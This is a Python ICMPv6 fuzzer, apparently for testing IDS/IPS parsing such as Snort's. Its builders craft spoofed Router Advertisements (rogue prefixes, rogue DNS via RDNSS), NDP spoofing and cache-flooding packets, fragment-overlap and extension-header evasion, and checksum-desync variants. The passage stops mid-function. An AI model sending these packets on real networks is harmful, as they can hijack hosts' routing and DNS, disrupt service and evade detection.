"""
ICMPv6 protocol fuzzer — 14 deep mutation strategies targeting IDS/IPS ICMPv6
processing, NDP state machines, MLD group tracking, IPv6 fragment reassembly,
and extension header chain parsing.

Target surface: Snort 3 codec/decoder (GID 131 — ICMPv6 events), IPv6 defrag
engine, NDP inspector, and gid-1 text rules using icmp6_type/icmp6_code
keywords.

RFC 4443 (ICMPv6), RFC 4861 (NDP), RFC 4862 (SLAAC), RFC 2460/8200 (IPv6),
RFC 2710/3810 (MLDv1/v2), RFC 6550 (RPL), RFC 8201 (IPv6 Path MTU).

Packet-type returns:
  - "icmpv6"    : raw ICMPv6 bytes — caller wraps in IPv6 + Ethernet
  - "fragments" : list of (payload, offset, mf, frag_id) tuples for IPv6 frags
  - "raw_ipv6"  : pre-built IPv6 packet (with header) — caller adds Ethernet
"""

import os
import random
import struct

# ── constants ────────────────────────────────────────────────────────

ICMPV6_PROTO = 58
_ETH_TYPE_IPV6 = b'\x86\xDD'

# Well-known IPv6 addresses (network-byte-order 16-byte tuples)
_ALL_NODES_LINK  = b'\xff\x02' + b'\x00' * 13 + b'\x01'       # ff02::1
_ALL_ROUTERS     = b'\xff\x02' + b'\x00' * 13 + b'\x02'       # ff02::2
_LOOPBACK        = b'\x00' * 15 + b'\x01'                      # ::1
_UNSPECIFIED     = b'\x00' * 16                                 # ::
_LINK_LOCAL_PFX  = b'\xfe\x80' + b'\x00' * 14                  # fe80::

_MAX_SEG = 58000

# ── checksum / helpers ───────────────────────────────────────────────

def _ipv6_pseudo_header(src: bytes, dst: bytes, upper_len: int,
                         next_header: int = ICMPV6_PROTO) -> bytes:
    """IPv6 pseudo-header for upper-layer checksum (RFC 2460 §8.1)."""
    return src + dst + struct.pack("!I", upper_len) + b'\x00' * 3 + struct.pack("B", next_header)

def _internet_checksum(data: bytes) -> int:
    """RFC 1071 Internet checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def _icmpv6_checksum(src: bytes, dst: bytes, icmpv6_msg: bytes) -> int:
    """Compute ICMPv6 checksum with IPv6 pseudo-header."""
    pseudo = _ipv6_pseudo_header(src, dst, len(icmpv6_msg))
    return _internet_checksum(pseudo + icmpv6_msg)

def _rand_link_local() -> bytes:
    """Random fe80::<EUI64> address."""
    return b'\xfe\x80' + b'\x00' * 6 + os.urandom(8)

def _rand_global() -> bytes:
    """Random 2001:db8::/32 documentation prefix address."""
    return b'\x20\x01\x0d\xb8' + os.urandom(12)

def _rand_mac() -> bytes:
    return os.urandom(6)

def _build_icmpv6(type_val, code, body, src=None, dst=None, checksum=None):
    """Generic ICMPv6 builder: type(1)+code(1)+checksum(2)+body."""
    if src is None:
        src = _rand_link_local()
    if dst is None:
        dst = _ALL_NODES_LINK
    hdr = struct.pack("!BBH", type_val, code, 0) + body
    if checksum is None:
        cs = _icmpv6_checksum(src, dst, hdr)
    else:
        cs = checksum & 0xFFFF
    return hdr[:2] + struct.pack("!H", cs) + hdr[4:], src, dst

def _echo6(type_val=128, code=0, id_val=None, seq=None, payload=b"",
           src=None, dst=None, checksum=None):
    """ICMPv6 Echo Request (128) or Reply (129)."""
    if id_val is None:
        id_val = random.randint(0, 0xFFFF)
    if seq is None:
        seq = random.randint(0, 0xFFFF)
    body = struct.pack("!HH", id_val, seq) + payload
    return _build_icmpv6(type_val, code, body, src, dst, checksum)

def _build_ipv6(src: bytes, dst: bytes, payload: bytes,
                next_header: int = ICMPV6_PROTO, hop_limit: int = 64,
                traffic_class: int = 0, flow_label: int = 0) -> bytes:
    """Build a complete IPv6 packet."""
    ver_tc_fl = (6 << 28) | ((traffic_class & 0xFF) << 20) | (flow_label & 0xFFFFF)
    hdr = struct.pack("!IHBB", ver_tc_fl, len(payload), next_header, hop_limit)
    return hdr + src + dst + payload

def _ndp_option(opt_type, data):
    """Build an NDP option TLV: type(1)+length_in_8_octets(1)+data."""
    total = 2 + len(data)
    # Pad to 8-byte boundary
    pad = (8 - (total % 8)) % 8
    raw = bytes([opt_type]) + bytes([(total + pad) // 8]) + data + b'\x00' * pad
    return raw

def _ndp_slla(mac=None):
    """Source Link-Layer Address option (Type 1)."""
    if mac is None:
        mac = _rand_mac()
    return _ndp_option(1, mac)

def _ndp_tlla(mac=None):
    """Target Link-Layer Address option (Type 2)."""
    if mac is None:
        mac = _rand_mac()
    return _ndp_option(2, mac)

def _ndp_prefix_info(prefix=None, prefix_len=64, flags=0xC0,
                     valid_lifetime=0xFFFFFFFF, preferred_lifetime=0xFFFFFFFF):
    """Prefix Information option (Type 3) for Router Advertisement."""
    if prefix is None:
        prefix = b'\x20\x01\x0d\xb8' + b'\x00' * 12
    data = struct.pack("!BBII", prefix_len, flags, valid_lifetime,
                       preferred_lifetime) + b'\x00' * 4 + prefix[:16]
    # Type 3, length = 4 (32 bytes)
    return bytes([3, 4]) + data

def _ndp_mtu_option(mtu=1500):
    """MTU option (Type 5) for Router Advertisement."""
    return bytes([5, 1]) + b'\x00\x00' + struct.pack("!I", mtu)

def _ndp_rdnss_option(addresses=None, lifetime=0xFFFFFFFF):
    """Recursive DNS Server option (Type 25, RFC 8106)."""
    if addresses is None:
        addresses = [_rand_global()]
    data = b'\x00\x00' + struct.pack("!I", lifetime)
    for addr in addresses:
        data += addr[:16]
    total = 2 + len(data)
    pad = (8 - (total % 8)) % 8
    return bytes([25, (total + pad) // 8]) + data + b'\x00' * pad

def _fake_inner_ipv6(src=None, dst=None, next_header=6, payload_len=40):
    """Fake embedded IPv6 header for error messages (first 40 bytes + transport)."""
    if src is None:
        src = _rand_global()
    if dst is None:
        dst = _rand_global()
    ver_tc_fl = (6 << 28)
    hdr = struct.pack("!IHBB", ver_tc_fl, payload_len, next_header, 64)
    return hdr + src + dst

def _tcp8v6(sport=None, dport=None):
    """First 8 bytes of TCP header."""
    if sport is None:
        sport = random.randint(1025, 65534)
    if dport is None:
        dport = random.choice([80, 443, 22, 25, 53, 445])
    return struct.pack("!HHI", sport, dport, random.randint(1, 0xFFFFFFFF))

def _udp8v6(sport=None, dport=None):
    """First 8 bytes of UDP header."""
    if sport is None:
        sport = random.randint(1025, 65534)
    if dport is None:
        dport = random.choice([53, 161, 547, 5353])
    return struct.pack("!HHHH", sport, dport, 100, 0)

def _error_msg6(type_val, code, body_prefix, embedded, src=None, dst=None, checksum=None):
    """Build ICMPv6 error: type+code+checksum+body_prefix+embedded.
    Error messages (Types 1-4) carry as much of the invoking packet as possible."""
    body = body_prefix + embedded
    return _build_icmpv6(type_val, code, body, src, dst, checksum)


# ── strategy / weight / label definitions ────────────────────────────

ICMPV6_STRATEGIES = [
    "ndp_ra_spoofing",
    "ndp_ns_na_confusion",
    "ndp_option_tlv_overflow",
    "fragment_header_evasion",
    "extension_header_chain",
    "pseudo_header_checksum_desync",
    "mld_multicast_abuse",
    "packet_too_big_pmtud",
    "parameter_problem_pointer",
    "echo_tunnel_covert_channel",
    "redirect_route_hijack",
    "dest_unreachable_state_exhaustion",
    "hop_limit_manipulation",
    "rpl_dao_dis_attack",
]

ICMPV6_WEIGHTS = [
    14,   # ndp_ra_spoofing                — SLAAC hijack, router tracking confusion
    12,   # ndp_ns_na_confusion            — NDP state machine attacks
    10,   # ndp_option_tlv_overflow        — option parser crashes
    14,   # fragment_header_evasion        — classic reassembly evasion
    10,   # extension_header_chain         — header chain parsing confusion
    8,    # pseudo_header_checksum_desync  — IDS/target checksum disagreement
    8,    # mld_multicast_abuse            — multicast group tracking abuse
    8,    # packet_too_big_pmtud           — PMTUD manipulation
    6,    # parameter_problem_pointer      — pointer-based error confusion
    10,   # echo_tunnel_covert_channel     — data exfil / cross-proto triggers
    8,    # redirect_route_hijack          — routing manipulation
    8,    # dest_unreachable_state_exhaustion — state table exhaustion
    6,    # hop_limit_manipulation         — TTL-based evasion
    4,    # rpl_dao_dis_attack             — IoT IDS RPL processing
]

ICMPV6_STRATEGY_LABELS = {
    "ndp_ra_spoofing":                   "NDP RA Spoofing",
    "ndp_ns_na_confusion":               "NDP NS/NA Confusion",
    "ndp_option_tlv_overflow":           "NDP Option TLV Overflow",
    "fragment_header_evasion":           "Fragment Header Evasion",
    "extension_header_chain":            "Extension Header Chain",
    "pseudo_header_checksum_desync":     "Pseudo-Header Checksum Desync",
    "mld_multicast_abuse":               "MLD Multicast Abuse",
    "packet_too_big_pmtud":              "Packet Too Big PMTUD",
    "parameter_problem_pointer":         "Parameter Problem Pointer",
    "echo_tunnel_covert_channel":        "Echo Tunnel Covert Channel",
    "redirect_route_hijack":             "Redirect Route Hijack",
    "dest_unreachable_state_exhaustion": "Dest Unreachable State Exhaust",
    "hop_limit_manipulation":            "Hop Limit Manipulation",
    "rpl_dao_dis_attack":                "RPL DAO/DIS Attack",
}

# ── per-strategy payload builders ────────────────────────────────────

def _build_ndp_ra_spoofing():
    """Forged Router Advertisements (Type 134) to hijack SLAAC, poison
    default router lists, inject rogue DNS via RDNSS, and confuse IDS
    router tracking.

    Variants: rogue prefix with on-link+autonomous flags, zero router
    lifetime (de-authorize legitimate router), MTU manipulation, RDNSS
    injection to redirect DNS, conflicting RAs from multiple sources,
    high-preference RA to override existing routers, max prefix flood.
    """
    variant = random.choice([
        "rogue_prefix", "zero_lifetime", "mtu_manipulation",
        "rdnss_injection", "conflicting_ras", "high_preference",
        "max_prefix_flood",
    ])
    src = _rand_link_local()
    dst = _ALL_NODES_LINK

    # RA body: cur_hop_limit(1) + M|O flags(1) + router_lifetime(2) +
    #          reachable_time(4) + retrans_timer(4) = 12 bytes
    if variant == "rogue_prefix":
        # Inject rogue /64 prefix with L+A flags → victims auto-configure
        ra_body = struct.pack("!BBHII", 64, 0xC0, 1800, 0, 0)
        evil_prefix = b'\x20\x01\x0d\xb8\xde\xad\xbe\xef' + b'\x00' * 8
        opts = _ndp_prefix_info(evil_prefix, 64, 0xC0) + _ndp_slla()
        body = ra_body + opts

    elif variant == "zero_lifetime":
        # Router Lifetime=0 → de-authorize, causing default route removal
        ra_body = struct.pack("!BBHII", 64, 0x00, 0, 0, 0)
        opts = _ndp_slla()
        body = ra_body + opts

    elif variant == "mtu_manipulation":
        # Inject absurd MTU values via RA MTU option
        mtu_val = random.choice([0, 1, 68, 1280, 9000, 65535])
        ra_body = struct.pack("!BBHII", 64, 0x00, 1800, 0, 0)
        opts = _ndp_mtu_option(mtu_val) + _ndp_slla()
        body = ra_body + opts

    elif variant == "rdnss_injection":
        # RDNSS option pointing to attacker-controlled DNS
        ra_body = struct.pack("!BBHII", 64, 0x00, 1800, 0, 0)
        evil_dns = b'\x20\x01\x0d\xb8' + b'\x00' * 8 + b'\xde\xad\xbe\xef'
        opts = _ndp_rdnss_option([evil_dns]) + _ndp_slla()
        body = ra_body + opts

    elif variant == "conflicting_ras":
        # RA with conflicting M/O flags — Managed=1 + Other=1 simultaneously
        ra_body = struct.pack("!BBHII", 64, 0xC0, 1800, 0, 0)
        # Two prefix info options with overlapping prefixes, different flags
        p1 = _ndp_prefix_info(b'\x20\x01\x0d\xb8' + b'\x00' * 12, 64, 0xC0)
        p2 = _ndp_prefix_info(b'\x20\x01\x0d\xb8' + b'\x00' * 12, 48, 0x40)
        opts = p1 + p2 + _ndp_slla()
        body = ra_body + opts

    elif variant == "high_preference":
        # Prf (default router preference) = 11 (reserved/invalid) in bits 3-4
        # Normal: 01=high, 00=medium, 11=reserved
        flags = 0x08 | 0xC0  # M=1, O=1, Prf=11(reserved)
        ra_body = struct.pack("!BBHII", 64, flags, 65535, 0, 0)
        opts = _ndp_prefix_info() + _ndp_slla()
        body = ra_body + opts

    else:  # max_prefix_flood
        # 10 prefix info options — exhaust prefix list
        ra_body = struct.pack("!BBHII", 64, 0x00, 1800, 0, 0)
        opts = b''
        for i in range(10):
            pfx = struct.pack("!BBBB", 0x20, 0x01, 0x0d, 0xb8 + i) + b'\x00' * 12
            opts += _ndp_prefix_info(pfx, 64, 0xC0)
        opts += _ndp_slla()
        body = ra_body + opts

    msg, src, dst = _build_icmpv6(134, 0, body, src, dst)
    return msg, "icmpv6", src, dst


def _build_ndp_ns_na_confusion():
    """NDP Neighbor Solicitation (135) / Advertisement (136) state machine
    attacks targeting IDS neighbor cache tracking.

    Variants: DAD interference (NA for target in DAD), gratuitous NA with
    override, solicited NA without matching NS, conflicting link-layer
    addresses, NS to unicast (should be multicast), NA flood for
    non-existent addresses, router flag confusion.
    """
    variant = random.choice([
        "dad_interference", "gratuitous_override", "unsolicited_na",
        "conflicting_lla", "unicast_ns", "na_flood", "router_flag",
    ])
    src = _rand_link_local()

    if variant == "dad_interference":
        # NA responding to a DAD probe (src=::) — prevent address assignment
        target = _rand_link_local()
        # NA: R=0, S=0, O=1 (override)
        flags = 0x20000000
        body = struct.pack("!I", flags) + target + _ndp_tlla()
        msg, src, dst = _build_icmpv6(136, 0, body, src, _ALL_NODES_LINK)

    elif variant == "gratuitous_override":
        # Gratuitous NA with Override flag — replace existing neighbor entry
        target = src  # advertising own address
        flags = 0x60000000  # S=1, O=1
        body = struct.pack("!I", flags) + target + _ndp_tlla()
        msg, src, dst = _build_icmpv6(136, 0, body, src, _ALL_NODES_LINK)

    elif variant == "unsolicited_na":
        # NA with Solicited flag but no matching NS was sent
        target = _rand_link_local()
        flags = 0x40000000  # S=1
        body = struct.pack("!I", flags) + target + _ndp_tlla()
        msg, src, dst = _build_icmpv6(136, 0, body, src, _rand_link_local())

    elif variant == "conflicting_lla":
        # NS with Source LLA that doesn't match the IPv6 source
        target = _rand_link_local()
        body = b'\x00' * 4 + target + _ndp_slla(b'\xDE\xAD\xBE\xEF\x00\x01')
        msg, src, dst = _build_icmpv6(135, 0, body, src, _ALL_NODES_LINK)

    elif variant == "unicast_ns":
        # NS sent to unicast instead of solicited-node multicast
        target = _rand_link_local()
        body = b'\x00' * 4 + target + _ndp_slla()
        msg, src, dst = _build_icmpv6(135, 0, body, src, target)

    elif variant == "na_flood":
        # NA for random targets — exhaust neighbor cache
        target = _rand_link_local()
        flags = 0x60000000
        body = struct.pack("!I", flags) + target + _ndp_tlla()
        msg, src, dst = _build_icmpv6(136, 0, body, _rand_link_local(), _ALL_NODES_LINK)

    else:  # router_flag
        # NA with Router flag set from a non-router source
        target = src
        flags = 0xE0000000  # R=1, S=1, O=1
        body = struct.pack("!I", flags) + target + _ndp_tlla()
        msg, src, dst = _build_icmpv6(136, 0, body, src, _ALL_NODES_LINK)

    return msg, "icmpv6", src, dst


def _build_ndp_option_tlv_overflow():
    """Malformed NDP option TLVs to crash/confuse the option parser.

    NDP options: Type(1)+Length_in_8_octets(1)+Data.
    Variants: length=0 (infinite loop), length overflows packet, truncated
    option, unknown type codes, nested options, type=0 (reserved),
    thousands of tiny options.
    """
    variant = random.choice([
        "zero_length", "length_overflow", "truncated", "unknown_type",
        "nested_options", "type_zero", "many_tiny", "negative_padding",
    ])
    src = _rand_link_local()
    dst = _ALL_NODES_LINK
    # Use RA as carrier
    ra_body = struct.pack("!BBHII", 64, 0x00, 1800, 0, 0)

    if variant == "zero_length":
        # Option with Length=0 → parser stuck in infinite loop
        opt = bytes([1, 0]) + b'\x00' * 6
        body = ra_body + opt
    elif variant == "length_overflow":
        # Option claims 255*8=2040 bytes but only 16 present
        opt = bytes([1, 255]) + os.urandom(14)
        body = ra_body + opt
    elif variant == "truncated":
        # SLLA option (type 1, len 1 = 8 bytes) but only 4 bytes provided
        opt = bytes([1, 1]) + os.urandom(2)
        body = ra_body + opt
    elif variant == "unknown_type":
        # Option type 200+ (unassigned)
        opt_type = random.randint(200, 254)
        opt = bytes([opt_type, 1]) + os.urandom(6)
        body = ra_body + opt
    elif variant == "nested_options":
        # Prefix Info containing another Prefix Info in its reserved area
        inner = _ndp_prefix_info()
        body = ra_body + _ndp_prefix_info() + bytes([3, 4]) + inner[2:]
    elif variant == "type_zero":
        # Type 0 is reserved — must not appear
        opt = bytes([0, 1]) + os.urandom(6)
        body = ra_body + opt
    elif variant == "many_tiny":
        # 100 SLLA options — option parser exhaustion
        opts = _ndp_slla() * 100
        body = ra_body + opts
    else:  # negative_padding
        # Option with length 2 (16 bytes) but data has NULLs that look like
        # sub-options with length 0
        opt = bytes([1, 2]) + b'\x00' * 14
        body = ra_body + opt

    msg, src, dst = _build_icmpv6(134, 0, body, src, dst)
    return msg, "icmpv6", src, dst


def _build_fragment_header_evasion():
    """IPv6 Fragment Header + ICMPv6 reassembly evasion.

    IPv6 fragmentation uses an extension header (Next Header 44):
      Next-Header(1)+Reserved(1)+Offset(13 bits)+Res(2)+M(1)+Identification(4)

    Variants: overlapping fragments, tiny fragments splitting ICMPv6 header
    across boundary, atomic fragment (offset=0, M=0), out-of-order,
    duplicate first, many tiny, gap fragment.
    """
    variant = random.choice([
        "overlapping", "tiny_header_split", "atomic_fragment",
        "out_of_order", "duplicate_first", "many_tiny", "gap_fragment",
    ])
    frag_id = random.randint(1, 0xFFFFFFFF)
    src = _rand_link_local()
    dst = _rand_link_local()
    # Build ICMPv6 Echo Request payload
    echo_body = struct.pack("!HH", random.randint(0, 0xFFFF),
                            random.randint(0, 0xFFFF)) + os.urandom(120)
    # Compute checksum for the full message
    full_msg = struct.pack("!BBH", 128, 0, 0) + echo_body
    cs = _icmpv6_checksum(src, dst, full_msg)
    icmpv6_pkt = struct.pack("!BBH", 128, 0, cs) + echo_body

    def _frag_hdr(offset_bytes, mf, next_hdr=ICMPV6_PROTO):
        """Build a Fragment Extension Header."""
        offset_units = offset_bytes // 8
        frag_off_m = (offset_units << 3) | (1 if mf else 0)
        return struct.pack("!BBH I", next_hdr, 0, frag_off_m, frag_id)

    def _ipv6_frag_packet(src, dst, frag_offset_bytes, mf, payload, nh=ICMPV6_PROTO):
        """Build complete IPv6 packet with Fragment Header."""
        fhdr = _frag_hdr(frag_offset_bytes, mf, nh)
        # Next Header in IPv6 header = 44 (Fragment)
        return _build_ipv6(src, dst, fhdr + payload, next_header=44, hop_limit=64)

    if variant == "overlapping":
        frag0 = _ipv6_frag_packet(src, dst, 0, True, icmpv6_pkt[:32])
        # Overlap: starts at offset 16, different bytes in overlap region
        overlap_data = os.urandom(16) + icmpv6_pkt[32:]
        frag1 = _ipv6_frag_packet(src, dst, 16, False, overlap_data)
        return [frag0, frag1], "fragments", src, dst

    elif variant == "tiny_header_split":
        # Split ICMPv6 header across fragment boundary (4 bytes each)
        frag0 = _ipv6_frag_packet(src, dst, 0, True, icmpv6_pkt[:8])
        frag1 = _ipv6_frag_packet(src, dst, 8, False, icmpv6_pkt[8:])
        return [frag0, frag1], "fragments", src, dst

    elif variant == "atomic_fragment":
        # Atomic fragment: offset=0, M=0 but Fragment Header present
        # Some IDS treat Fragment Header presence differently
        frag0 = _ipv6_frag_packet(src, dst, 0, False, icmpv6_pkt)
        return [frag0], "fragments", src, dst

    elif variant == "out_of_order":
        chunk = 32
        parts = []
        off = 0
        while off < len(icmpv6_pkt):
            end = min(off + chunk, len(icmpv6_pkt))
            mf = end < len(icmpv6_pkt)
            parts.append(_ipv6_frag_packet(src, dst, off, mf, icmpv6_pkt[off:end]))
            off = end
        parts.reverse()
        return parts, "fragments", src, dst

    elif variant == "duplicate_first":
        alt_echo = struct.pack("!BBH", 128, 0, 0) + struct.pack("!HH",
            random.randint(0, 0xFFFF), random.randint(0, 0xFFFF)) + os.urandom(120)
        cs2 = _icmpv6_checksum(src, dst, alt_echo)
        alt_pkt = alt_echo[:2] + struct.pack("!H", cs2) + alt_echo[4:]
        mid = 64
        frag0a = _ipv6_frag_packet(src, dst, 0, True, icmpv6_pkt[:mid])
        frag0b = _ipv6_frag_packet(src, dst, 0, True, alt_pkt[:mid])
        frag1 = _ipv6_frag_packet(src, dst, mid, False, icmpv6_pkt[mid:])
        return [frag0a, frag0b, frag1], "fragments", src, dst

    elif variant == "many_tiny":
        frags = []
        off = 0
        while off < len(icmpv6_pkt):
            end = min(off + 8, len(icmpv6_pkt))
            mf = end < len(icmpv6_pkt)
            frags.append(_ipv6_frag_packet(src, dst, off, mf, icmpv6_pkt[off:end]))
            off = end
        # Pad to 50+ fragments
        while len(frags) < 50:
            frags.append(_ipv6_frag_packet(src, dst, off, True, os.urandom(8)))
            off += 8
        # Fix last
        frags[-1] = _ipv6_frag_packet(src, dst, off - 8, False, os.urandom(8))
        return frags, "fragments", src, dst

    else:  # gap_fragment
        frag0 = _ipv6_frag_packet(src, dst, 0, True, icmpv6_pkt[:32])
        # Skip 32 bytes, send from offset 64
        frag2_data = icmpv6_pkt[64:] if len(icmpv6_pkt) > 64 else os.urandom(32)
        frag2 = _ipv6_frag_packet(src, dst, 64, False, frag2_data)
        return [frag0, frag2], "fragments", src, dst


def _build_extension_header_chain():
    """Long/reordered IPv6 extension header chains before ICMPv6.

    RFC 8200 §4.1 recommended order: Hop-by-Hop(0) → Destination(60) →
    Routing(43) → Fragment(44) → AH(51) → ESP(50) → Destination(60) → Upper.
    IDS must traverse the chain to find ICMPv6; long/disordered chains
    may cause the parser to give up or crash.

    Variants: max-depth chain, repeated Destination Options, wrong order,
    unknown next-header, Hop-by-Hop not first, Routing Header type 0
    (deprecated/dangerous), AH with bad data.
    """
    variant = random.choice([
        "max_depth", "repeated_dest", "wrong_order",
        "unknown_next_header", "hbh_not_first",
        "routing_type0", "many_padding",
    ])
    src = _rand_link_local()
    dst = _rand_link_local()
    echo, src, dst = _echo6(128, 0, src=src, dst=dst, payload=os.urandom(32))

    def _hbh_header(next_hdr, options=b'\x01\x04\x00\x00\x00\x00'):
        """Hop-by-Hop Options header (type 0)."""
        hdr_ext_len = (2 + len(options) + 7) // 8 - 1
        pad = (hdr_ext_len + 1) * 8 - 2 - len(options)
        return struct.pack("BB", next_hdr, hdr_ext_len) + options + b'\x00' * pad

    def _dest_opts_header(next_hdr, options=b'\x01\x04\x00\x00\x00\x00'):
        """Destination Options header (type 60)."""
        hdr_ext_len = (2 + len(options) + 7) // 8 - 1
        pad = (hdr_ext_len + 1) * 8 - 2 - len(options)
        return struct.pack("BB", next_hdr, hdr_ext_len) + options + b'\x00' * pad

    def _routing_header(next_hdr, routing_type=0, segments_left=0, data=b'\x00' * 4):
        """Routing header (type 43)."""
        hdr_ext_len = (4 + len(data) + 7) // 8 - 1
        pad = (hdr_ext_len + 1) * 8 - 4 - len(data)
        return struct.pack("BBBB", next_hdr, hdr_ext_len, routing_type,
                          segments_left) + data + b'\x00' * pad

    if variant == "max_depth":
        # 10 extension headers chained: HBH → Dest × 8 → ICMPv6
        chain = _hbh_header(60)
        for i in range(7):
            chain += _dest_opts_header(60)
        chain += _dest_opts_header(ICMPV6_PROTO)
        chain += echo
        return _build_ipv6(src, dst, chain, next_header=0), "raw_ipv6", src, dst

    elif variant == "repeated_dest":
        # 20 Destination Options headers — parser exhaustion
        chain = b''
        for i in range(19):
            chain += _dest_opts_header(60)
        chain += _dest_opts_header(ICMPV6_PROTO) + echo
        return _build_ipv6(src, dst, chain, next_header=60), "raw_ipv6", src, dst

    elif variant == "wrong_order":
        # Routing before Hop-by-Hop (violates RFC 8200)
        chain = _routing_header(0) + _hbh_header(ICMPV6_PROTO) + echo
        return _build_ipv6(src, dst, chain, next_header=43), "raw_ipv6", src, dst

    elif variant == "unknown_next_header":
        # Unknown next-header value (253 = experimental)
        chain = _hbh_header(253) + struct.pack("BB", ICMPV6_PROTO, 0) + \
                b'\x00' * 6 + echo
        return _build_ipv6(src, dst, chain, next_header=0), "raw_ipv6", src, dst

    elif variant == "hbh_not_first":
        # Hop-by-Hop as second header (must be first per RFC)
        chain = _dest_opts_header(0) + _hbh_header(ICMPV6_PROTO) + echo
        return _build_ipv6(src, dst, chain, next_header=60), "raw_ipv6", src, dst

    elif variant == "routing_type0":
        # Deprecated Routing Header Type 0 (used for amplification attacks)
        # segments_left > 0 with intermediate addresses
        data = _rand_global() + _rand_global()  # 2 intermediate hops
        chain = _routing_header(ICMPV6_PROTO, routing_type=0,
                               segments_left=2, data=data) + echo
        return _build_ipv6(src, dst, chain, next_header=43), "raw_ipv6", src, dst

    else:  # many_padding
        # Hop-by-Hop with 200+ bytes of PadN options
        pad_opts = bytes([1, 198]) + b'\x00' * 198  # PadN type=1, len=198
        chain = _hbh_header(ICMPV6_PROTO, pad_opts) + echo
        return _build_ipv6(src, dst, chain, next_header=0), "raw_ipv6", src, dst


def _build_pseudo_header_checksum_desync():
    """ICMPv6 checksum manipulation for IDS/target disagreement.

    ICMPv6 checksum is MANDATORY and includes the IPv6 pseudo-header.
    Variants: checksum computed with wrong src, wrong dst, wrong length,
    wrong next-header, zero checksum (invalid), 0xFFFF, checksum for
    different message type.
    """
    variant = random.choice([
        "wrong_src", "wrong_dst", "wrong_length", "wrong_next_header",
        "zero_checksum", "ffff_checksum", "type_swap",
    ])
    real_src = _rand_link_local()
    real_dst = _rand_link_local()
    payload = os.urandom(56)
    echo_body = struct.pack("!HH", random.randint(0, 0xFFFF),
                            random.randint(0, 0xFFFF)) + payload

    if variant == "wrong_src":
        fake_src = _rand_link_local()
        msg = struct.pack("!BBH", 128, 0, 0) + echo_body
        cs = _icmpv6_checksum(fake_src, real_dst, msg)
        msg = msg[:2] + struct.pack("!H", cs) + msg[4:]
        return msg, "icmpv6", real_src, real_dst

    elif variant == "wrong_dst":
        fake_dst = _rand_link_local()
        msg = struct.pack("!BBH", 128, 0, 0) + echo_body
        cs = _icmpv6_checksum(real_src, fake_dst, msg)
        msg = msg[:2] + struct.pack("!H", cs) + msg[4:]
        return msg, "icmpv6", real_src, real_dst

    elif variant == "wrong_length":
        msg = struct.pack("!BBH", 128, 0, 0) + echo_body
        # Compute checksum with wrong upper-layer length
        pseudo = _ipv6_pseudo_header(real_src, real_dst, len(msg) + 100)
        cs = _internet_checksum(pseudo + msg)
        msg = msg[:2] + struct.pack("!H", cs) + msg[4:]
        return msg, "icmpv6", real_src, real_dst

    elif variant == "wrong_next_header":
        msg = struct.pack("!BBH", 128, 0, 0) + echo_body
        # Compute checksum with next_header=17 (UDP) instead of 58
        pseudo = _ipv6_pseudo_header(real_src, real_dst, len(msg), 17)
        cs = _internet_checksum(pseudo + msg)
        msg = msg[:2] + struct.pack("!H", cs) + msg[4:]
        return msg, "icmpv6", real_src, real_dst

    elif variant == "zero_checksum":
        msg = struct.pack("!BBH", 128, 0, 0) + echo_body
        return msg, "icmpv6", real_src, real_dst

    elif variant == "ffff_checksum":
        msg = struct.pack("!BBH", 128, 0, 0xFFFF) + echo_body
        return msg, "icmpv6", real_src, real_dst

    else:  # type_swap
        # Compute checksum as type 128, then change to type 129
        msg = struct.pack("!BBH", 128, 0, 0) + echo_body
        cs = _icmpv6_checksum(real_src, real_dst, msg)
        msg = struct.pack("!BBH", 129, 0, cs) + echo_body
        return msg, "icmpv6", real_src, real_dst


def _build_mld_multicast_abuse():
    """MLDv1 (RFC 2710) / MLDv2 (RFC 3810) multicast group management abuse.

    MLDv1: Query(130), Report(131), Done(132) — 24-byte messages.
    MLDv2: Query(130, extended), Report(143) — variable length.

    Variants: join all-routers group, leave critical group, query with
    max response code, report for reserved group, MLDv2 with many aux
    data records, invalid record types, rapid join/leave flood.
    """
    variant = random.choice([
        "join_all_routers", "leave_critical", "max_response_query",
        "reserved_group", "mldv2_many_records", "invalid_record_type",
        "rapid_join_leave",
    ])
    src = _rand_link_local()

    if variant == "join_all_routers":
        # MLDv1 Report (131) for ff02::2 (all-routers) — shouldn't be joined by hosts
        body = struct.pack("!HH", 0, 0) + _ALL_ROUTERS
        msg, src, dst = _build_icmpv6(131, 0, body, src, _ALL_ROUTERS)

    elif variant == "leave_critical":
        # MLDv1 Done (132) for ff02::1 (all-nodes) — disrupts basic multicast
        body = struct.pack("!HH", 0, 0) + _ALL_NODES_LINK
        msg, src, dst = _build_icmpv6(132, 0, body, src, _ALL_ROUTERS)

    elif variant == "max_response_query":
        # MLDv1 Query with Maximum Response Delay = 0xFFFF (65535ms)
        group = b'\x00' * 16  # general query
        body = struct.pack("!HH", 0xFFFF, 0) + group
        msg, src, dst = _build_icmpv6(130, 0, body, src, _ALL_NODES_LINK)

    elif variant == "reserved_group":
        # Report for a reserved multicast address (ff00::)
        group = b'\xff\x00' + b'\x00' * 14
        body = struct.pack("!HH", 0, 0) + group
        msg, src, dst = _build_icmpv6(131, 0, body, src, group)

    elif variant == "mldv2_many_records":
        # MLDv2 Report (143) with 50 multicast address records
        records = b''
        for i in range(50):
            group = b'\xff\x02' + b'\x00' * 13 + bytes([i + 10])
            # Record: type(1)+aux_len(1)+num_sources(2)+multicast(16)
            records += struct.pack("!BBH", 1, 0, 0) + group
        body = struct.pack("!HH", 0, 50) + records
        msg, src, dst = _build_icmpv6(143, 0, body, src, _ALL_NODES_LINK)

    elif variant == "invalid_record_type":
        # MLDv2 Report with invalid record type (>6)
        group = b'\xff\x02' + b'\x00' * 13 + b'\x0A'
        record = struct.pack("!BBH", 255, 0, 0) + group
        body = struct.pack("!HH", 0, 1) + record
        msg, src, dst = _build_icmpv6(143, 0, body, src, _ALL_NODES_LINK)

    else:  # rapid_join_leave
        # Report for random group
        group = b'\xff\x02' + os.urandom(14)
        body = struct.pack("!HH", 0, 0) + group
        msg, src, dst = _build_icmpv6(131, 0, body, src, group)

    return msg, "icmpv6", src, dst


def _build_packet_too_big_pmtud():
    """ICMPv6 Packet Too Big (Type 2, Code 0) PMTUD manipulation.

    Unlike ICMPv4, Packet Too Big is the ONLY way to signal MTU limits in
    IPv6 (no DF flag). MTU field is mandatory. Minimum IPv6 MTU = 1280.

    Variants: zero MTU, below-minimum MTU (< 1280), MTU=1 (absurd),
    max MTU, targeting active TCP connection, contradictory (MTU > original),
    rapid oscillation.
    """
    variant = random.choice([
